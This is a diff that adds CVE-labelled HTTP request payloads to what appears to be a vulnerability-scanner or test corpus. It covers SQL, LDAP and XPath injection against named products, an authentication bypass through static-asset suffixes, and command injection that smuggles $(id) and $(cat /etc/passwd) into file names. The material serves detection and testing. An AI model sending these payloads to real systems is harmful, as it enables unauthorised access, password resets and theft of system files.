@@ -4366,3 +4366,53 @@ GET /twopcz?Action=%3Cscript%3Ealert(1)%3C%2Fscript%3E
 
 # --- CVE-2026-102982 (Plane): stored unsafe URL scheme in comment_html. ---
 POST /api/v1/workspaces/acme/projects/1/issues/1/comments/ header="Content-Type: application/json" body="{\"comment_html\":\"<a href=\\\"javascript:alert(1)\\\">click</a>\"}"
+
+# --- CVE-2026-110130 (Dockhand): the global auth hook skips authentication
+#     for any path ending in a static-asset extension, so an unauthenticated
+#     PUT to a user-mutation route with a .js/.css suffix resets passwords. ---
+PUT /api/users/1.js
+PUT /api/users/1.css
+PUT /api/users/admin.png
+
+# --- CVE-2026-55386 (InvoiceShelf): ORDER BY SQL injection through the
+#     orderByField query parameter in Invoice::scopeApplyFilters. ---
+GET /api/v1/invoices?orderByField=(select%20sleep(5))
+GET /api/v1/invoices?orderByField=id%2C%20(select%20sleep(5))
+GET /api/v1/invoices?orderByField=1%20union%20select%20user()
+
+# --- CVE-2026-110614 (Yiuman citrus): ORDER BY SQL injection through the
+#     sortBy parameter of the generic query framework. ---
+GET /api/list?sortBy=(select%20sleep(5))
+GET /api/list?sortBy=1%20and%20sleep(5)
+
+# --- CVE-2026-110609 (Dromara Skyeye): SQL injection through the keyword
+#     parameter of the queryWarehousingDetails MyBatis statement. ---
+GET /queryWarehousingDetails?keyword=1%27%20or%20%271%27=%271
+GET /queryWarehousingDetails?keyword=1%27%20union%20select%201,2,3--
+
+# --- CVE-2026-89310 (T-SQL): a request-body parameter is interpolated into a
+#     T-SQL statement without parameterization. ---
+POST /api/reports header="Content-Type: application/json" body="{\"filter\":\"1' or '1'='1\"}"
+POST /api/reports header="Content-Type: application/json" body="{\"filter\":\"1; WAITFOR DELAY '0:0:5'--\"}"
+
+# --- CVE-2026-89071 (Progress MOVEit Transfer): LDAP filter injection in the
+#     LDAP module through the login parameters. ---
+POST /human.aspx header="Content-Type: application/x-www-form-urlencoded" body="username=*)(uid=*&password=x"
+GET /human.aspx?username=admin)(userPassword=anything
+
+# --- CVE-2026-89076 (Progress MOVEit Transfer): SQL injection in the Custom
+#     Reports module. ---
+GET /reports/custom?name=1%27%20union%20select%20user()
+POST /reports/custom header="Content-Type: application/x-www-form-urlencoded" body="name=1%27%20and%20sleep(5)--"
+
+# --- CVE-2026-53582 (OPNsense): XPath injection through Trust module
+#     certificate-authority and certificate refid values. ---
+GET /api/trust/ca/search?refid=x%27%5D%7C%2F%2Fca%5B1%5D
+POST /api/trust/cert/search header="Content-Type: application/x-www-form-urlencoded" body="refid=x']//ca[1]"
+
+# --- CVE-2026-110634 (git-diff), CVE-2026-110635 (webp-converter), and
+#     CVE-2026-110650 (thumbnail): OS command injection through file names and
+#     paths interpolated into shell commands. ---
+POST /api/convert header="Content-Type: application/x-www-form-urlencoded" body="source=$(id).png&target=out.webp"
+POST /api/extract header="Content-Type: application/x-www-form-urlencoded" body="archive=report`id`.zip&target=/tmp/out"
+GET /download?path=uploads/$(cat%20/etc/passwd).mp4
